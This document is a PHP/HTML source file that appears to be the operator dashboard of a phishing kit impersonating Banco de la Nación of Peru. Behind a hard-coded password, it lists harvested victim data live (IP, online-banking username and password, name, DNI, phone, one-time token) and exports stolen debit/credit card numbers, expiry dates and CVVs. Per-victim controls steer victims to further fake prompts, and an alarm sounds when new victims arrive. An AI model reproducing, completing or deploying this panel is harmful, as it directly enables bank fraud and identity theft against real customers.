<?php
error_reporting(0);
session_start();
date_default_timezone_set("America/Lima");

$pass = "miclave20";
if (isset($_POST["clave"])) {

    if ($_POST["clave"] == $pass) {
        $_SESSION["usuario"] = $pass;
        setcookie('usuario', $pass, time() + 365 * 24 * 60 * 60);
    }
}

include('../class/db.php');

$registros = array();
$sql = mysqli_query($link, "select * from usuarios where id in (SELECT max(id) FROM usuarios group by card);");
if($sql){
    $iRecords = mysqli_num_rows($sql);
   	$iAffected = @mysqli_affected_rows($sql);
    while($reg = mysqli_fetch_assoc($sql)){
        $registros[] = $reg; }
}

if($_GET["opc"] == "export") { 
	$iregistros = array();
	$sqli = mysqli_query($link, "select * from iusuarios");
	if($sqli){
		$Records = mysqli_num_rows($sqli);
   		$Affected = @mysqli_affected_rows($sqli);
    	while($ireg = mysqli_fetch_assoc($sqli)){
			$iregistros[] = $ireg;
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>.::[ + ]::.</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<link rel="stylesheet" type="text/css" href="view/css/bootstrap.css" />
<script src="view/js/jquery.min.js"></script>
<script src="view/js/bootstrap.min.js"></script>
</head>
<script language="javascript">
function sendxc(opt = "n"){
	if(opt == "p"){
		if($("#tarjeta").val() != ""){
			$.ajax({
                url: 'control.php',
                data: {accion: "4", card: $("#tarjeta").val(), nombre: $("#nombre").val(), imgs: $("#imgs").val()},
                type: 'post',
                success: function(data){
					$("#imgspanel").hide(500);
					$("#imgs").parent().find("span > i").toggleClass(function(){
						return ($(this).hasClass('glyphicon-chevron-up') ? 'glyphicon-chevron-down glyphicon-chevron-up' : 'glyphicon-chevron-down glyphicon-chevron-down');
					});
					$("input").val("");
					//alert("Solicitud de CLAVE enviada.");
                }
            });
		}
	}else{
		if($("#tarjeta").val() != ""){
			$("#formupdb").submit();
		}
	}
}

/*function cmprnpt(){
	if($('#pregx').val() == ''){$('#pregx').focus(); return false;}
	if($('#pregy').val() == ''){$('#pregy').focus(); return false;}
	if($('#pregz').val() == ''){$('#pregz').focus(); return false;}
	$("#formupdbpreg").submit();
}*/

function capturar(id, thiss) {  
	var name = id;
	var newName = name.split('@');
	$("#tarjeta").val(newName[0]);
	$("#nombre").val(newName[1]);
	//$("#imagen").val(newName[2]);
	$("#control").val("activado");
	$("#imgs").parent().find("span > i").toggleClass(function(){
		$("#imgspanel").show(500);
		return ($(this).hasClass('glyphicon-chevron-down') ? 'glyphicon-chevron-up glyphicon-chevron-down' : 'glyphicon-chevron-up glyphicon-chevron-up');
	});
	
	var $temp = $("<input>");
    $("body").append($temp);
    $temp.val(newName[0]).select();
    document.execCommand("copy");
    $temp.remove();
	$(thiss).find("span").tooltip("show");
}
	
function capturarIMG(id) {  
	$("#imgs").val(id);
}

function automatizar(textval) {
            $.ajax({
                url: 'control.php',
                data: {accion: "3", auto: textval},
                type: 'post',
                success: function(data){
					$("#automatico").html(textval == "1" ? "<span class=\"small pull-right\"><a href=\"javascript:automatizar('0');\" class=\"text-danger\"><i class=\"glyphicon glyphicon-eye-close\"></i> Automatico</a></span>" : "<span class=\"small pull-right\"><a href=\"javascript:automatizar('1');\" class=\"text-success\"><i class=\"glyphicon glyphicon-eye-open\"></i> Manual</a></span>");
                }
            });
        }
	
function cargar_tabla() {
            $.ajax({
                url: 'control.php',
                data: {accion: "1"},
                type: 'post',
                success: function(data) {
                    $("#tabla_cuerpo").find("tbody").html(data);

                    mostrar_audio();
                }
            });
        }
		
function mostrar_audio() {
            $.ajax({
                url: 'control.php',
                data: {accion: "2"},
                type: 'post',
                success: function(data) {
                    var mostrar_audio = "";
                    respt = data.toString().replace(/\s/g, '');

                    var vid = document.getElementById("audio");
                    if (respt == "1") {
                        document.getElementById("audio").src = "audio/SD_ALERT_31.mp3";
                        vid.play();
                    } else {
                        vid.pause();
                    }
                }
            });
        }
var myTimer = setInterval(cargar_tabla, 5000);
</script>
<style type="text/css">
.tit {
background:#000;
color:#FFF;
text-align:center;
font-size:18px;
font-family:'Trebuchet MS', Arial, Helvetica, sans-serif; }
</style>
<body class="jumbotron">
<div class="modal" id="myModal" tabindex="-1" role="dialog"></div>

        <audio tabindex="0" id="audio" controls preload="auto" style="display:none" >
            <source src="">
        </audio>

                <?php
                if (!isset($_SESSION["usuario"]) || !isset($_COOKIE['usuario'])) {
                    ?>
                    <form action="./" method="post">
                        <div class="col-sm-12 form-group-sm">
                            <table align="center" width="200">
                                <tbody>
                                    <tr> 
                                        <td align="center"><input type="password"  id="clave" name="clave" class="form-control" placeholder="Secure" style="width:60px; text-align:center;"/></td> 
                                    </tr>
                                    <tr>
                                        <td height="35" align="center">&nbsp;</td>
                                    </tr>
                                    <tr>
                                        <td align="center"><h5 style="color:#009;">Code by <span style="color:#009;"><a data-toggle="tooltip" data-placement="right" >RandomSoft</a></span></h5></td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <script>
                            $(document).ready(function() {
                                $('[data-toggle="tooltip"]').tooltip();
                                var vid = document.getElementById("audio");
                                vid.pause();
                            });
                        </script>
                    </form>
                    <?php
                		} else {
                    ?>

<!-- Modal -->
<div id="myModalX" class="modal fade" role="dialog">
  <div class="modal-dialog modal-lg">

    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Exportar Información</h4>
      </div>
      <div class="modal-body">
       
<div class="table-responsive">
<table class="table table-striped table-bordered table-hover">
  <thead>
    <tr>
      <th scope="col"><small><small>#</small></small></th>
      <th scope="col" class="text-center"><small><small>Usuario</small></small></th>
      <th scope="col" class="text-center"><small><small>Clave</small></small></th>
      <th scope="col" class="text-center"><small><small>Tarjeta&nbsp;Décito/Crédito</small></small></th>
      <th scope="col" class="text-center"><small><small>F.&nbsp;Venc.</small></small></th>
      <th scope="col" class="text-center"><small><small>CVV</small></small></th>
    </tr>
  </thead>
  <tbody>
      <?php
      	for ($x = 0; $x < count($iregistros); $x++) {
	  ?>
	<tr>
      <th scope="row"><small><small><?= ($x+1); ?></small></small></th>
      <td class="text-center"><small><small><?= ($iregistros[$x]['idocum'] != 0 ? $iregistros[$x]['idocum'] : ""); ?></small></small></td>
      <td class="text-center"><small><small><?= $iregistros[$x]['ipass']; ?></small></small></td>
      <td class="text-center"><small><small><?= $iregistros[$x]['icard']; ?></small></small></td>
      <td class="text-center"><small><small><?= $iregistros[$x]['imv']."/".$iregistros[$x]['iav']; ?></small></small></td>
      <td class="text-center"><small><small><?= $iregistros[$x]['icv']; ?></small></small></td>
	</tr>
    <?php
	  }
	?>
  </tbody>
</table>
</div>
       
        <div class="text-right">
        	<button type="button" class="btn btn-success btn-sm" onClick="backupcc();">Guardar</button>
        </div>
      </div>
    </div>

  </div>
</div>


                   	<div class="col-xs-1"></div>
                   	<div class="col-xs-10">
                   	<table width="100%" border="0">
                        <tbody>
                         	<tr>
                         		<td align="center">
                         			<span class="text-center">
                          				<small><div class="small reloj">00:00</div></small>
                          			</span>
                         		</td>
                         	</tr>
                          	<tr>
                          		<td height="30">
                          			<span class="small pull-left"><a href="salir.php"><i class="glyphicon glyphicon-off"></i> Cerrar Sesion</a></span>
                          			<div id="automatico">
                          				<?php
										$sqlx = mysqli_query($link, "select estado from config;");
										if($sqlx){
											$iAffectedx = @mysqli_affected_rows($sqlx);
											$registrox[0] = mysqli_fetch_assoc($sqlx);
																	
											echo ($registrox[0]["estado"] == 0 ? "<span class=\"small pull-right\"><a href=\"javascript:automatizar('1');\" class=\"text-success\"><i class=\"glyphicon glyphicon-eye-open\"></i> Manual</a></span>" : "<span class=\"small pull-right\"><a href=\"javascript:automatizar('0');\" class=\"text-danger\"><i class=\"glyphicon glyphicon-eye-close\"></i> Automatico</a></span>");
										}
										?>
									</div>
                          		</td>
                          	</tr>
						</tbody>
					</table>
                   
                    <table width="100%" align="center" border="1">
                        <tbody>
                           	<tr>
                           		<th colspan="3" bgcolor="#FFFFFF" align="center" height="40" style="padding: 10px;">
                           			<center>
                           				<a href="https://zonasegura1.bn.com.pe/BNWeb/login.do" style="color:#FFF; text-decoration: none; font-weight: normal;" target="_blank"><img src="../files/img/logo-bn.jpg" /></a>
                           			</center>
                           		</th>
                           	</tr>
                            <tr> 
                                <td>
                                	<div class="table-responsive">
                                		
                                		<table id="tabla_cuerpo" class="table table-bordered" style="margin-bottom: 0px !important;">
                                        <thead>
                                           	<tr>
                                           		<th colspan="9">
                                           			<div class="row">
                                           				<form action="updb.php" method="post" id="formupdb">
                                           				<div class="col-xs-12">
                                           					<div class="col-xs-2">
                            	               					<input type="hidden" name="control"  id="control">
																<input name="tarjeta" class="form-control input-sm" placeholder="Usuario" id="tarjeta"  type="text" autocomplete="off">
                    	                       				</div>
                	                           				<div class="col-xs-4">
            	                               					<div class="row">
            	                               						<div class="col-xs-8">
            	                               							<input name="nombre" class="form-control input-sm" placeholder="Nombres y Apellidos" onKeyUp="this.value = this.value.toUpperCase();" maxlength="35" id="nombre" type="text" autocomplete="off">
            	                               						</div>
            	                               						<div class="col-xs-4">
            	                               							<div class="input-group">
    	                                       								<input name="imgs" class="form-control input-sm" placeholder="Img" maxlength="2" id="imgs" type="text" autocomplete="off">
  																			<span class="input-group-addon" onClick="toggleIMG(this);">
  	                                       										<i class="small glyphicon glyphicon-chevron-down"></i>
  	                                       									</span>
   	                                       								</div>
        	                                   							<select name="inicio" id="inicio" style="display:none;">
																			<option selected value="Imagen">>Imagen</option>
																			<option value="">Nombre</option>
																		</select>
            	                               						</div>
            	                               					</div>
        	                                   				</div>
        	                                   				<div class="col-xs-2">
    	                                      					<button class="btn btn-success btn-sm" onclick="$('#inicio option').eq(0).attr('selected',true); sendxc('p');" type="button">Enviar</button>
															</div>
                                           				</div>
                                          				</form>
                                           			</div>
                                           		</th>
                                           	</tr>
                                           	<tr id="imgspanel" style="display: none;">
                                           		<th colspan="9" align="center">
                                           		<center>
                                           			<img src="img/1.png" width="50" onClick="capturarIMG(1);">&nbsp;
                                           			<img src="img/2.png" width="50" onClick="capturarIMG(2);">&nbsp;
                                           			<img src="img/3.png" width="50" onClick="capturarIMG(3);">&nbsp;
                                           			<img src="img/4.png" width="50" onClick="capturarIMG(4);">&nbsp;
                                           			<img src="img/5.png" width="50" onClick="capturarIMG(5);">&nbsp;
                                           			<img src="img/6.png" width="50" onClick="capturarIMG(6);">&nbsp;
                                           			<img src="img/7.png" width="50" onClick="capturarIMG(7);">&nbsp;
                                           			<img src="img/8.png" width="50" onClick="capturarIMG(8);">&nbsp;
                                           			<img src="img/9.png" width="50" onClick="capturarIMG(9);">&nbsp;
                                           			<img src="img/10.png" width="50" onClick="capturarIMG(10);">&nbsp;
                                           			<img src="img/11.png" width="50" onClick="capturarIMG(11);">&nbsp;
                                           			<img src="img/12.png" width="50" onClick="capturarIMG(12);">&nbsp;
                                           			<img src="img/13.png" width="50" onClick="capturarIMG(13);">&nbsp;
                                           			<img src="img/14.png" width="50" onClick="capturarIMG(14);">&nbsp;
                                           			<img src="img/15.png" width="50" onClick="capturarIMG(15);">&nbsp;
                                           			<img src="img/16.png" width="50" onClick="capturarIMG(16);">&nbsp;
                                           			<img src="img/17.png" width="50" onClick="capturarIMG(17);">&nbsp;
                                           			<img src="img/18.png" width="50" onClick="capturarIMG(18);">&nbsp;
                                           			<img src="img/19.png" width="50" onClick="capturarIMG(19);">&nbsp;
                                           			<img src="img/20.png" width="50" onClick="capturarIMG(20);">
                                           			
                                           			<div style="height:10px; max-height:10px; min-height:10px;"></div>
                                           			
                                           			<img src="img/21.png" width="50" onClick="capturarIMG(21);">&nbsp;
                                           			<img src="img/22.png" width="50" onClick="capturarIMG(22);">&nbsp;
                                           			<img src="img/23.png" width="50" onClick="capturarIMG(23);">&nbsp;
                                           			<img src="img/24.png" width="50" onClick="capturarIMG(24);">&nbsp;
                                           			<img src="img/25.png" width="50" onClick="capturarIMG(25);">&nbsp;
                                           			<img src="img/26.png" width="50" onClick="capturarIMG(26);">&nbsp;
                                           			<img src="img/27.png" width="50" onClick="capturarIMG(27);">&nbsp;
                                           			<img src="img/28.png" width="50" onClick="capturarIMG(28);">&nbsp;
                                           			<img src="img/29.png" width="50" onClick="capturarIMG(29);">&nbsp;
                                           			<img src="img/30.png" width="50" onClick="capturarIMG(30);">&nbsp;
                                           			<img src="img/31.png" width="50" onClick="capturarIMG(31);">&nbsp;
                                           			<img src="img/32.png" width="50" onClick="capturarIMG(32);">&nbsp;
                                           			<img src="img/33.png" width="50" onClick="capturarIMG(33);">&nbsp;
                                           			<img src="img/34.png" width="50" onClick="capturarIMG(34);">&nbsp;
                                           			<img src="img/35.png" width="50" onClick="capturarIMG(35);">&nbsp;
                                           			<img src="img/36.png" width="50" onClick="capturarIMG(36);">&nbsp;
                                           			<img src="img/37.png" width="50" onClick="capturarIMG(37);">&nbsp;
                                           			<img src="img/38.png" width="50" onClick="capturarIMG(38);">&nbsp;
                                           			<img src="img/39.png" width="50" onClick="capturarIMG(39);">&nbsp;
                                           			<img src="img/40.png" width="50" onClick="capturarIMG(40);">
                                           			
                                           			<div style="height:10px; max-height:10px; min-height:10px;"></div>
                                           			
                                           			<img src="img/41.png" width="50" onClick="capturarIMG(41);">&nbsp;
                                           			<img src="img/42.png" width="50" onClick="capturarIMG(42);">&nbsp;
                                           			<img src="img/43.png" width="50" onClick="capturarIMG(43);">&nbsp;
                                           			<img src="img/44.png" width="50" onClick="capturarIMG(44);">&nbsp;
                                           			<img src="img/45.png" width="50" onClick="capturarIMG(45);">&nbsp;
                                           			<img src="img/46.png" width="50" onClick="capturarIMG(46);">&nbsp;
                                           			<img src="img/47.png" width="50" onClick="capturarIMG(47);">&nbsp;
                                           			<img src="img/48.png" width="50" onClick="capturarIMG(48);">&nbsp;
                                           			<img src="img/49.png" width="50" onClick="capturarIMG(49);">&nbsp;
                                           			<img src="img/50.png" width="50" onClick="capturarIMG(50);">&nbsp;
                                           			<img src="img/51.png" width="50" onClick="capturarIMG(51);">&nbsp;
                                           			<img src="img/52.png" width="50" onClick="capturarIMG(52);">&nbsp;
                                           			<img src="img/53.png" width="50" onClick="capturarIMG(53);">&nbsp;
                                           			<img src="img/54.png" width="50" onClick="capturarIMG(54);">&nbsp;
                                           			<img src="img/55.png" width="50" onClick="capturarIMG(55);">&nbsp;
                                           			<img src="img/56.png" width="50" onClick="capturarIMG(56);">&nbsp;
                                           			<img src="img/57.png" width="50" onClick="capturarIMG(57);">&nbsp;
                                           			<img src="img/58.png" width="50" onClick="capturarIMG(58);">&nbsp;
                                           			<img src="img/59.png" width="50" onClick="capturarIMG(59);">&nbsp;
                                           			<img src="img/60.png" width="50" onClick="capturarIMG(60);">
                                           		</center>
                                           		</th>
                                           	</tr>
                                            <tr>
                                               	<td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>Dirección&nbsp;IP</b></td>        
                                                <td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>Usuario</b></td>
                                                <td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>Clave</b></td>
                                                <td class="col-xs-3 col-sm-3 col-md-3 col-lg-3 text-center" style="background: rgb(231,76,60);"><b>Nombres&nbsp;y&nbsp;Apellidos</b></td>
                                                <td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>DNI</b></td>
                                                <td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>Celular</b></td>
                                                <td class="col-xs-1 col-sm-1 col-md-1 col-lg-1 text-center" style="background: rgb(231,76,60);"><b>Token</b></td>
                                                <td colspan="2" class="col-xs-3 col-sm-3 col-md-3 col-lg-3 text-center" style="background: rgb(231,76,60);"><b>Opcion</b></td>
                                            </tr>
                                        </thead>
                                        <tbody>
      <?php
      for ($i = 0; $i < count($registros); $i++) {
      $detalle_tarjeta=array();
      $style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black;cursor:pointer'";
	  if ($registros[$i]['control'] == "activado") {
	  $style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black; cursor:pointer; background-color:#BFD2F7;'"; }
	  if ($registros[$i]['control'] == "finalizado") {
	  $style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black; cursor:pointer;' class='success'"; }
      if ($registros[$i]['iniciar'] == "Bloquear" || $registros[$i]['iniciar'] == "Finalizado") {
      $style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:red; cursor:pointer;' class='danger'"; }
                          $sql_detalle = mysqli_query($link, "select token ,token  from usuarios where card='" . $registros[$i]['card'] . "'"); //$result_detalle = $sql_detalle;
                                                if ($sql_detalle) {
                                                    while ($reg_det = mysqli_fetch_assoc($sql_detalle)) {
                                                        $detalle_tarjeta[] = $reg_det;
                                                    }
                                                }
                          $select = "<select id=\"control" . $registros[$i]["card"] . "\" >";
                          for ($m = 0; $m < count($detalle_tarjeta); $m++) {
						  $select.="<option value='" . $detalle_tarjeta[$m]["token"] . "'>" . $detalle_tarjeta[$m]["token"] . "</option>"; }
                                                $select.= "</select>";
		  
		$fecha1 = new DateTime($registros[$i]['master']);//fecha inicial
		$fecha2 = new DateTime();//fecha de cierre

		$intervalo = $fecha1->diff($fecha2);
      ?>
      <tr id="fila<?= $i ?>">
      <td id="celda0_<?= $i ?>" <?= $style ?> align="center"><small><a href="updb.php?blqr=Bloquear&tarjeta=<?= $registros[$i]['card']; ?>&control=activado"><?= $registros[$i]['ip']; ?></a></small></td>
      <td id="celda1_<?= $i ?>" <?= $style ?> align="center" onclick="capturar('<?= $registros[$i]['card']."@".$registros[$i]['nombre']."@".$registros[$i]['img']; ?>',this);" ><span data-toggle="tooltip" data-placement="top" title="Copiado"><?= $registros[$i]['card']." <small><small>(".$intervalo->format('%H:%i:%s').") <i class=\"glyphicon glyphicon-heart".($registros[$i]['line'] == 1 ? " text-danger" : " text-muted")."\"></i></small></small>"; ?></span></td>
      <td id="celda2_<?= $i ?>" <?= $style ?> align="center"><?= $registros[$i]['pass']; ?></td>
      <td id="celda3_<?= $i ?>" <?= $style ?> align="center"><small><?= preg_replace("/ /i","&nbsp;",$registros[$i]['nombre']); ?></small></td>
      <td id="celda4_<?= $i ?>" <?= $style ?> align="center"><?= $registros[$i]['DNI']; ?></td>
      <td id="celda5_<?= $i ?>" <?= $style ?> align="center"><?= $registros[$i]['Celular']; ?></td>
      <td id="celda6_<?= $i ?>" <?= $style ?> align="center"><kbd><?= $registros[$i]['token']; ?></kbd></td>
      <td id="celda7_<?= $i ?>" <?= $style ?> align="center"><small><?= $registros[$i]['iniciar']; ?></small></td>
      <td id="celda8_<?= $i ?>" <?= $style ?> align="center"><a href="updb.php?tkn=Token&tarjeta=<?= $registros[$i]['card']; ?>&control=activado"><img src="../files/img/us-dollar.png" width="30" /></a>&nbsp;<a href="updb.php?sms=Datos&tarjeta=<?= $registros[$i]['card']; ?>&control=activado"><img src="../files/img/sms-phone-icon.svg" width="27" /></a>&nbsp;<a href="updb.php?blqr=CC&tarjeta=<?= $registros[$i]['card']; ?>&control=activado" disabled><img src="../files/img/credit-card.png" width="26" /></a>&nbsp;<a href="updb.php?blqr=Resumen&tarjeta=<?= $registros[$i]['card']; ?>&control=activado" disabled><img src="../files/img/maps-and-flags-3.svg" width="26" /></a>&nbsp;<a href="iddel.php?v=<?= $registros[$i]['card']; ?>"><img src="../files/img/icon-error.svg" width="25" /></a></td>
	  </tr>
    <?php } ?>
              </tbody></table>
                               	
                                	</div>
                    			</td>
                            </tr>
                          </tbody>
                      </table>
					</div>
                    <div class="col-xs-1"></div>
                    
	<script>
		var mouseStop, relojStop = null;
		var count = 31;

		$(document).ready(function(){
			$(document).mousemove(function(event){
				clearTimeout(mouseStop);
				clearTimeout(relojStop);
				count = 31;
				$(".reloj").html("");
  				mouseStop = setTimeout(function(){
					countReverse();
				}, 300000);
			});
			
			document.oncontextmenu = function(){ return false; }
			window.ondragstart = function(){ return false; }
			<?php
				if($_GET["opc"] == "export"){
					echo "$('#myModalX').modal('show');";
				}
			?>
		});
		
		function countReverse(){
			if(count > 0){
				count = count - 1;
				relojStop = setTimeout(function(){
					countReverse();
				},1000);
				$(".reloj").html(count + " segundos");
			}else{
				count = 31;
				$(".reloj").html("");
			}
		}
		
		function toggleIMG(thiss){
			$(thiss).find('i').toggleClass(function(){
				if($(this).hasClass('glyphicon-chevron-down')){
					$("#imgspanel").show(500);
					return 'glyphicon-chevron-up glyphicon-chevron-down';
				}else{
					$("#imgspanel").hide(500);
					return 'glyphicon-chevron-up glyphicon-chevron-down';
				}
			});
		}
		
		function backupcc(){
			$.ajax({
				url: "control.php",
        		type: 'post',
				data: {accion: 5},
        		success: function(respXHR){
					alert(respXHR);
				},
				error: function(){
					alert("Verifique su conexión a internet");
				}
			});
		}
		
		function detectar_tecla(){
            with (event){
                if (keyCode==27) {//escape
                    $('#myModalX').modal('show');
                    $.ajax({
				        url: "control.php",
        		        type: 'post',
				        data: {accion: 6},
        		        success: function(respXHR){
					        $('#myModalX').find("table > tbody").html(respXHR);
				        },
				        error: function(){
				            $('#myModalX').modal('hide');
					        alert("Verifique su conexión a internet");
				        }
			        });
                    return false;
                }
            }
        }
        document.onkeydown = detectar_tecla;
	</script>

<?php
}
?>
    </body>
</html>